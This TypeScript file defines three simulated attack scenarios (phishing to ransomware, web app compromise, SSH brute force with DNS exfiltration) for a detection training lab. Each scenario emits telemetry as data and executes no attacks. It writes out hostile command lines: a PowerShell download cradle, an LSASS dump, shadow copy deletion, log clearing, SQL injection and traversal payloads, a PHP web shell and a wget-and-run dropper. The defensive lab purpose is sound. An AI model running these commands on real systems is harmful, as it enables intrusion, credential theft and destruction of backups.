// Attack scenarios for the lab. A scenario only produces raw telemetry; it never tells
// the detection layer what happened. Whether a step is caught is decided purely by the
// Sigma rules, the WAF and the intel matcher, which is the point of the exercise.

import { encodePowerShell, hex, int, pick } from "./util";
import { dns, linuxNet, linuxProc, sshd, winNet, winProc, winSec, type Emitter, type ProcRef } from "./telemetry";

export interface StepContext {
  em: Emitter;
  run: string;
  step: number;
  tick: number;
  mem: Record<string, unknown>;
  /** Source address the attacker uses for this run. */
  attacker: string;
}

export type StepOutcome = { ok: true } | { ok: false; reason: string };

export interface StepDef {
  at: number;
  span?: number;
  label: string;
  detail: string;
  technique: string;
  host: string;
  gate?: { hosts?: string[]; attackerIp?: boolean; account?: string };
  expect: string[];
  run(ctx: StepContext): StepOutcome;
}

export interface ScenarioDef {
  id: string;
  name: string;
  tagline: string;
  narrative: string;
  attacker: string;
  entry: string;
  targets: string[];
  hints: string[];
  /** Response actions offered in the lab while the run is live. "attacker" means the run's source address. */
  responses: { action: "isolate_host" | "block_ip" | "disable_account" | "waf_mode"; target: string; label: string }[];
  steps: StepDef[];
}

const OK: StepOutcome = { ok: true };
const PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
const CMD = "C:\\Windows\\System32\\cmd.exe";
const USER = "CORP\\a.sharma";

export const SCENARIOS: ScenarioDef[] = [
  {
    id: "phish-ransom",
    name: "Phishing to ransomware staging",
    tagline: "Macro document, LSASS dump, PsExec and shadow copy deletion",
    narrative: "A finance user opens an invoice lure. The macro pulls a PowerShell stager from attacker infrastructure, dumps credentials, reuses the backup service account to reach the file server and prepares it for encryption.",
    attacker: "192.0.2.44",
    entry: "win-endpoint-01",
    targets: ["win-endpoint-01", "fs-lab-01"],
    hints: ["Isolate win-endpoint-01 before second 30 to stop lateral movement.", "Disable CORP\\svc_backup to make the PsExec step fail.", "Isolate fs-lab-01 to save the shadow copies."],
    responses: [
      { action: "isolate_host", target: "win-endpoint-01", label: "Isolate win-endpoint-01" },
      { action: "disable_account", target: "CORP\\svc_backup", label: "Disable CORP\\svc_backup" },
      { action: "isolate_host", target: "fs-lab-01", label: "Isolate fs-lab-01" },
    ],
    steps: [
      {
        at: 2, label: "Invoice lure opened", detail: "OUTLOOK.EXE starts WINWORD.EXE with Q3_Invoice_4471.docm. Opening a document is normal, but the file hash is on the malware feed.", technique: "T1566.001", host: "win-endpoint-01", gate: { hosts: ["win-endpoint-01"] }, expect: ["intel_ioc_match"],
        run: ({ em, run, step, mem }) => {
          const outlook: ProcRef = { guid: "{6A1E0C4B-11F2-4C1A-9E00-OUTLOOK00001}", pid: 4120, image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", cmd: '"OUTLOOK.EXE" /recycle' };
          mem.word = winProc(em, { host: "win-endpoint-01", user: USER, image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", cmd: '"WINWORD.EXE" /n "C:\\Users\\a.sharma\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\7QX2L9B1\\Q3_Invoice_4471.docm" /o ""', parent: outlook, hash: "5F2B7C1E9A8D4B3F6E0C2A9D7B4E1F8C3A6D9B2E5F8C1A4D7B0E3F6A9C2D5B8E", run, step }, 120);
          return OK;
        },
      },
      {
        at: 6, label: "Macro launches encoded PowerShell", detail: "WINWORD.EXE spawns powershell.exe with a hidden window and an encoded download cradle.", technique: "T1059.001", host: "win-endpoint-01", gate: { hosts: ["win-endpoint-01"] }, expect: ["office_spawn_shell", "ps_encoded_command", "ps_encoded_cradle"],
        run: ({ em, run, step, mem }) => {
          const script = "IEX (New-Object Net.WebClient).DownloadString('http://update-cdn.example:8443/s2.ps1')";
          mem.ps = winProc(em, { host: "win-endpoint-01", user: USER, image: PS, cmd: `powershell.exe -nop -w hidden -enc ${encodePowerShell(script)}`, parent: mem.word as ProcRef, run, step }, 300);
          return OK;
        },
      },
      {
        at: 10, label: "Stager calls back to C2", detail: "PowerShell resolves update-cdn.example and connects to 192.0.2.44 on port 8443.", technique: "T1071.001", host: "win-endpoint-01", gate: { hosts: ["win-endpoint-01"] }, expect: ["ps_nonstandard_port", "intel_ioc_match"],
        run: ({ em, run, step }) => {
          dns(em, { host: "win-endpoint-01", query: "update-cdn.example", answer: "192.0.2.44", run, step }, 100);
          winNet(em, { host: "win-endpoint-01", user: USER, image: PS, dstIp: "192.0.2.44", dstPort: 8443, dstHost: "update-cdn.example", run, step }, 260);
          return OK;
        },
      },
      {
        at: 16, label: "LSASS memory dumped", detail: "rundll32 calls comsvcs.dll MiniDump against LSASS (PID 724) to harvest cached credentials.", technique: "T1003.001", host: "win-endpoint-01", gate: { hosts: ["win-endpoint-01"] }, expect: ["lsass_comsvcs_dump", "lsass_access"],
        run: ({ em, run, step, mem }) => {
          const rd = winProc(em, { host: "win-endpoint-01", user: USER, image: "C:\\Windows\\System32\\rundll32.exe", cmd: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 724 C:\\Users\\Public\\perf.dmp full", parent: mem.ps as ProcRef, integrity: "High", run, step }, 150);
          em.emit({ sensor: "Sysmon", logsource: { product: "windows", category: "process_access" }, host: "win-endpoint-01", user: USER, message: "Process accessed: rundll32.exe opened lsass.exe with 0x1fffff", fields: { EventID: 10, Computer: "win-endpoint-01", SourceImage: rd.image, SourceProcessGUID: rd.guid, TargetImage: "C:\\Windows\\system32\\lsass.exe", GrantedAccess: "0x1fffff", CallTrace: "C:\\Windows\\SYSTEM32\\ntdll.dll+9d204|C:\\Windows\\System32\\comsvcs.dll+3c0f" }, run, step }, 420);
          return OK;
        },
      },
      {
        at: 22, label: "Domain reconnaissance", detail: "net group \"Domain Admins\" /domain and nltest /dclist enumerate privileged accounts and controllers.", technique: "T1087.002", host: "win-endpoint-01", gate: { hosts: ["win-endpoint-01"] }, expect: ["domain_discovery"],
        run: ({ em, run, step, mem }) => {
          const cmd = winProc(em, { host: "win-endpoint-01", user: USER, image: CMD, cmd: "cmd.exe /c whoami /all & net group \"Domain Admins\" /domain & nltest /dclist:corp.local", parent: mem.ps as ProcRef, run, step }, 50);
          winProc(em, { host: "win-endpoint-01", user: USER, image: "C:\\Windows\\System32\\net.exe", cmd: 'net group "Domain Admins" /domain', parent: cmd, run, step }, 200);
          winProc(em, { host: "win-endpoint-01", user: USER, image: "C:\\Windows\\System32\\nltest.exe", cmd: "nltest /dclist:corp.local", parent: cmd, run, step }, 520);
          return OK;
        },
      },
      {
        at: 30, label: "PsExec to the file server", detail: "The dumped svc_backup credentials are used to open ADMIN$ on fs-lab-01 and install PSEXESVC.", technique: "T1021.002", host: "fs-lab-01", gate: { hosts: ["win-endpoint-01", "fs-lab-01"] }, expect: ["admin_share_access", "psexec_service"],
        run: ({ em, run, step, mem }) => {
          if (em.world.disabled.has("CORP\\svc_backup")) {
            winSec(em, "fs-lab-01", 4625, { TargetUserName: "svc_backup", TargetDomainName: "CORP", LogonType: 3, IpAddress: "10.10.20.15", Status: "0xC0000072", SubStatus: "0x0", WorkstationName: "WIN-ENDPOINT-01" }, "An account failed to log on: CORP\\svc_backup (account disabled)", { user: "CORP\\svc_backup", run, step }, 100);
            return { ok: false, reason: "CORP\\svc_backup is disabled, so the network logon was refused." };
          }
          winSec(em, "fs-lab-01", 4624, { TargetUserName: "svc_backup", TargetDomainName: "CORP", LogonType: 3, IpAddress: "10.10.20.15", WorkstationName: "WIN-ENDPOINT-01", AuthenticationPackageName: "NTLM" }, "An account was successfully logged on: CORP\\svc_backup from 10.10.20.15 (NTLM)", { user: "CORP\\svc_backup", run, step }, 100);
          winSec(em, "fs-lab-01", 5140, { SubjectUserName: "svc_backup", SubjectDomainName: "CORP", ShareName: "\\\\*\\ADMIN$", IpAddress: "10.10.20.15", ObjectType: "File" }, "A network share object was accessed: \\\\*\\ADMIN$ by CORP\\svc_backup", { user: "CORP\\svc_backup", run, step }, 240);
          em.emit({ sensor: "Windows System", logsource: { product: "windows", service: "system" }, host: "fs-lab-01", user: "CORP\\svc_backup", message: "A service was installed in the system: PSEXESVC", fields: { EventID: 7045, Computer: "fs-lab-01", ServiceName: "PSEXESVC", ImagePath: "%SystemRoot%\\PSEXESVC.exe", ServiceType: "user mode service", StartType: "demand start", AccountName: "LocalSystem" }, run, step }, 420);
          const svc: ProcRef = { guid: "{9C21A0E2-5B6D-4F0A-8E11-PSEXESVC0001}", pid: 5512, image: "C:\\Windows\\PSEXESVC.exe", cmd: "C:\\Windows\\PSEXESVC.exe" };
          mem.fsCmd = winProc(em, { host: "fs-lab-01", user: "CORP\\svc_backup", image: CMD, cmd: "cmd.exe", parent: svc, integrity: "High", run, step }, 610);
          return OK;
        },
      },
      {
        at: 38, label: "Defender switched off", detail: "Real time monitoring disabled on fs-lab-01 ahead of the payload.", technique: "T1562.001", host: "fs-lab-01", gate: { hosts: ["fs-lab-01"] }, expect: ["defender_tamper"],
        run: ({ em, run, step, mem }) => {
          winProc(em, { host: "fs-lab-01", user: "CORP\\svc_backup", image: PS, cmd: "powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true", parent: mem.fsCmd as ProcRef, integrity: "High", run, step }, 200);
          return OK;
        },
      },
      {
        at: 44, label: "Shadow copies deleted", detail: "vssadmin and WMIC remove every volume shadow copy so files cannot be restored.", technique: "T1490", host: "fs-lab-01", gate: { hosts: ["fs-lab-01"] }, expect: ["shadow_copy_delete"],
        run: ({ em, run, step, mem }) => {
          winProc(em, { host: "fs-lab-01", user: "CORP\\svc_backup", image: "C:\\Windows\\System32\\vssadmin.exe", cmd: "vssadmin.exe delete shadows /all /quiet", parent: mem.fsCmd as ProcRef, integrity: "High", run, step }, 150);
          winProc(em, { host: "fs-lab-01", user: "CORP\\svc_backup", image: "C:\\Windows\\System32\\wbem\\WMIC.exe", cmd: "wmic.exe shadowcopy delete /nointeractive", parent: mem.fsCmd as ProcRef, integrity: "High", run, step }, 640);
          return OK;
        },
      },
      {
        at: 50, label: "Security log cleared", detail: "wevtutil clears the Security log to slow the investigation.", technique: "T1070.001", host: "fs-lab-01", gate: { hosts: ["fs-lab-01"] }, expect: ["eventlog_cleared"],
        run: ({ em, run, step, mem }) => {
          winProc(em, { host: "fs-lab-01", user: "CORP\\svc_backup", image: "C:\\Windows\\System32\\wevtutil.exe", cmd: "wevtutil.exe cl Security", parent: mem.fsCmd as ProcRef, integrity: "High", run, step }, 100);
          winSec(em, "fs-lab-01", 1102, { SubjectUserName: "svc_backup", SubjectDomainName: "CORP" }, "The audit log was cleared by CORP\\svc_backup", { user: "CORP\\svc_backup", run, step }, 300);
          return OK;
        },
      },
    ],
  },
  {
    id: "web-compromise",
    name: "Web application compromise",
    tagline: "sqlmap, UNION injection, web shell upload and reverse shell",
    narrative: "An attacker scans the staging API, which sits behind the WAF in detection only mode. SQL injection leaks the users table, a PHP web shell is uploaded and used to pull a dropper and open a reverse shell.",
    attacker: "203.0.113.77",
    entry: "api-staging-01",
    targets: ["api-staging-01"],
    hints: ["Switch the WAF for api-staging-01 to blocking mode.", "Or block the attacking address at the edge.", "Isolating api-staging-01 stops the shell, but only after the data has leaked."],
    responses: [
      { action: "waf_mode", target: "api-staging-01", label: "Switch api-staging-01 WAF to blocking" },
      { action: "block_ip", target: "attacker", label: "Block the attacker at the edge" },
      { action: "isolate_host", target: "api-staging-01", label: "Isolate api-staging-01" },
    ],
    steps: [
      {
        at: 2, span: 10, label: "Automated SQL injection scan", detail: "sqlmap probes /api/v1/products with boolean, time based and UNION payloads.", technique: "T1595.002", host: "api-staging-01", gate: { hosts: ["api-staging-01"] }, expect: ["web_scanner_ua", "waf_sqli", "intel_ioc_match"],
        run: ({ em, run, step, tick, attacker }) => {
          const payloads = ["1%20AND%201=1", "1%20AND%201=2", "1'%20AND%20'a'='a", "1%20AND%20SLEEP(5)", "1)%20AND%20(SELECT%201%20FROM%20pg_sleep(5))--", "1%20ORDER%20BY%206--", "1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL--", "1%20UNION%20SELECT%20table_name,NULL%20FROM%20information_schema.tables--"];
          for (let i = 0; i < 3; i += 1) em.web({ run, step, host: "api-staging-01", ip: attacker, method: "GET", uri: `/api/v1/products?id=${payloads[(tick * 3 + i) % payloads.length]}`, status: 200, bytes: int(em.r, 900, 1500), ua: "sqlmap/1.8.3#stable (https://sqlmap.org)" }, i * 300 + 20);
          return OK;
        },
      },
      {
        at: 14, label: "Users table extracted", detail: "UNION SELECT returns usernames and password hashes in a 48 KB response.", technique: "T1190", host: "api-staging-01", gate: { hosts: ["api-staging-01"] }, expect: ["sqli_success", "waf_sqli"],
        run: ({ em, run, step, attacker }) => {
          const res = em.web({ run, step, host: "api-staging-01", ip: attacker, method: "GET", uri: "/api/v1/products?id=12%20union%20select%20username,password_hash%20from%20users--", status: 200, bytes: 48211, ua: "sqlmap/1.8.3#stable (https://sqlmap.org)" }, 100);
          return res.blocked ? { ok: false, reason: "The WAF blocked the injection with HTTP 403." } : OK;
        },
      },
      {
        at: 20, label: "Traversal reads /etc/passwd", detail: "The download endpoint follows ../ sequences outside the web root.", technique: "T1190", host: "api-staging-01", gate: { hosts: ["api-staging-01"] }, expect: ["waf_lfi"],
        run: ({ em, run, step, attacker }) => {
          const res = em.web({ run, step, host: "api-staging-01", ip: attacker, method: "GET", uri: "/api/v1/download?file=..%2f..%2f..%2f..%2fetc%2fpasswd", status: 200, bytes: 2214, ua: "Mozilla/5.0 (X11; Linux x86_64)" }, 100);
          return res.blocked ? { ok: false, reason: "The WAF blocked the traversal with HTTP 403." } : OK;
        },
      },
      {
        at: 26, label: "PHP web shell uploaded", detail: "avatar.php containing system($_GET['cmd']) is accepted by the upload endpoint.", technique: "T1505.003", host: "api-staging-01", gate: { hosts: ["api-staging-01"] }, expect: ["webshell_upload", "waf_rce"],
        run: ({ em, run, step, attacker }) => {
          const res = em.web({ run, step, host: "api-staging-01", ip: attacker, method: "POST", uri: "/api/v1/uploads?filename=avatar.php", status: 201, bytes: 88, ua: "Mozilla/5.0 (X11; Linux x86_64)", body: "<?php system($_GET['cmd']); ?>" }, 100);
          return res.blocked ? { ok: false, reason: "The WAF blocked the PHP payload with HTTP 403." } : OK;
        },
      },
      {
        at: 32, label: "Web shell executes commands", detail: "Requests to /uploads/avatar.php?cmd= make PHP FPM spawn /bin/sh as www-data.", technique: "T1059.004", host: "api-staging-01", gate: { hosts: ["api-staging-01"] }, expect: ["webserver_shell", "www_recon", "webshell_upload"],
        run: ({ em, run, step, attacker }) => {
          const res = em.web({ run, step, host: "api-staging-01", ip: attacker, method: "GET", uri: "/uploads/avatar.php?cmd=id", status: 200, bytes: 54, ua: "Mozilla/5.0 (X11; Linux x86_64)" }, 50);
          if (res.blocked) return { ok: false, reason: "Requests from the attacker are blocked." };
          linuxProc(em, { host: "api-staging-01", user: "www-data", image: "/bin/sh", cmd: "sh -c id", parentImage: "/usr/sbin/php-fpm8.2", run, step }, 120);
          linuxProc(em, { host: "api-staging-01", user: "www-data", image: "/bin/sh", cmd: "sh -c uname -a; cat /etc/passwd", parentImage: "/usr/sbin/php-fpm8.2", run, step }, 700);
          return OK;
        },
      },
      {
        at: 38, label: "Dropper downloaded and run", detail: "wget pulls k.sh from 192.0.2.10 into /tmp and runs it with bash.", technique: "T1105", host: "api-staging-01", gate: { hosts: ["api-staging-01"], attackerIp: true }, expect: ["linux_download_exec", "intel_ioc_match"],
        run: ({ em, run, step }) => {
          linuxProc(em, { host: "api-staging-01", user: "www-data", image: "/bin/sh", cmd: "sh -c wget http://192.0.2.10/k.sh -O /tmp/k.sh; bash /tmp/k.sh", parentImage: "/usr/sbin/php-fpm8.2", run, step }, 100);
          return OK;
        },
      },
      {
        at: 44, label: "Reverse shell opened", detail: "bash connects out to 192.0.2.10 on port 4444.", technique: "T1059.004", host: "api-staging-01", gate: { hosts: ["api-staging-01"] }, expect: ["linux_reverse_shell", "intel_ioc_match"],
        run: ({ em, run, step }) => {
          linuxNet(em, { host: "api-staging-01", user: "www-data", image: "/usr/bin/bash", dstIp: "192.0.2.10", dstPort: 4444, run, step }, 200);
          return OK;
        },
      },
    ],
  },
  {
    id: "ssh-exfil",
    name: "SSH brute force and DNS exfiltration",
    tagline: "Password guessing, pivot to the database, data out over DNS",
    narrative: "An attacker guesses the deploy password on the internet facing bastion, pivots to the PostgreSQL server with the deploy key, dumps the customers table and smuggles it out as DNS queries.",
    attacker: "203.0.113.200",
    entry: "linux-jump-01",
    targets: ["linux-jump-01", "db-lab-01"],
    hints: ["Block the attacking address as soon as the brute force alert fires.", "Disabling the deploy account stops the login.", "Isolating db-lab-01 cuts the DNS channel."],
    responses: [
      { action: "block_ip", target: "attacker", label: "Block the attacker at the edge" },
      { action: "disable_account", target: "deploy", label: "Disable the deploy account" },
      { action: "isolate_host", target: "db-lab-01", label: "Isolate db-lab-01" },
    ],
    steps: [
      {
        at: 2, span: 12, label: "SSH password guessing", detail: "Around 30 failed passwords against deploy, admin and root in twelve seconds.", technique: "T1110.001", host: "linux-jump-01", gate: { hosts: ["linux-jump-01"], attackerIp: true }, expect: ["ssh_bruteforce"],
        run: ({ em, run, step, attacker }) => {
          const n = int(em.r, 2, 3);
          for (let i = 0; i < n; i += 1) {
            const user = pick(em.r, ["deploy", "deploy", "deploy", "admin", "root", "ubuntu"]);
            sshd(em, { host: "linux-jump-01", event: user === "admin" ? "invalid_user" : "failed_password", user, ip: attacker, run, step }, i * 280 + 30);
          }
          return OK;
        },
      },
      {
        at: 16, label: "deploy password guessed", detail: "Accepted password for deploy from the attacking address.", technique: "T1078", host: "linux-jump-01", gate: { hosts: ["linux-jump-01"], attackerIp: true }, expect: ["ssh_bruteforce_success"],
        run: ({ em, run, step, attacker }) => {
          if (em.world.disabled.has("deploy")) {
            sshd(em, { host: "linux-jump-01", event: "failed_password", user: "deploy", ip: attacker, run, step }, 100);
            return { ok: false, reason: "The deploy account is locked, so the correct password was refused." };
          }
          sshd(em, { host: "linux-jump-01", event: "accepted_password", user: "deploy", ip: attacker, run, step }, 100);
          return OK;
        },
      },
      {
        at: 22, label: "Pivot to db-lab-01", detail: "deploy reuses its SSH key to reach the database server. Internal key based SSH looks normal, so no rule fires here.", technique: "T1021.004", host: "db-lab-01", gate: { hosts: ["linux-jump-01", "db-lab-01"], account: "deploy" }, expect: [],
        run: ({ em, run, step }) => {
          linuxProc(em, { host: "linux-jump-01", user: "deploy", image: "/usr/bin/ssh", cmd: "ssh deploy@10.10.40.12", parentImage: "/bin/bash", run, step }, 50);
          sshd(em, { host: "db-lab-01", event: "accepted_publickey", user: "deploy", ip: "10.10.20.31", run, step }, 300);
          linuxProc(em, { host: "db-lab-01", user: "deploy", image: "/usr/bin/sudo", cmd: "sudo -l", parentImage: "/bin/bash", run, step }, 600);
          return OK;
        },
      },
      {
        at: 28, label: "Customers table dumped", detail: "pg_dump writes the customers table into a hidden folder in /tmp and tar compresses it.", technique: "T1560.001", host: "db-lab-01", gate: { hosts: ["db-lab-01"], account: "deploy" }, expect: ["db_archive_staging"],
        run: ({ em, run, step }) => {
          linuxProc(em, { host: "db-lab-01", user: "deploy", image: "/usr/bin/pg_dump", cmd: "pg_dump -h 127.0.0.1 -U app -t customers -f /tmp/.cache/c.sql shop", parentImage: "/bin/bash", run, step }, 100);
          linuxProc(em, { host: "db-lab-01", user: "deploy", image: "/usr/bin/tar", cmd: "tar czf /tmp/.cache/c.tgz /tmp/.cache/c.sql", parentImage: "/bin/bash", run, step }, 700);
          return OK;
        },
      },
      {
        at: 34, span: 22, label: "Data smuggled out over DNS", detail: "The archive is hex encoded into 40 character labels under t.exfil-sync.example.", technique: "T1048.003", host: "db-lab-01", gate: { hosts: ["db-lab-01"] }, expect: ["dns_long_label", "dns_tunnel_volume"],
        run: ({ em, run, step, tick, mem }) => {
          const seq = (mem.seq as number | undefined) ?? 0;
          const n = 2;
          for (let i = 0; i < n; i += 1) dns(em, { host: "db-lab-01", query: `${hex(em.r, 40)}.${seq + i}.t.exfil-sync.example`, answer: "198.51.100.250", run, step }, i * 450 + 40);
          mem.seq = seq + n;
          void tick;
          return OK;
        },
      },
    ],
  },
];

export const scenarioById = (id: string) => SCENARIOS.find((s) => s.id === id);
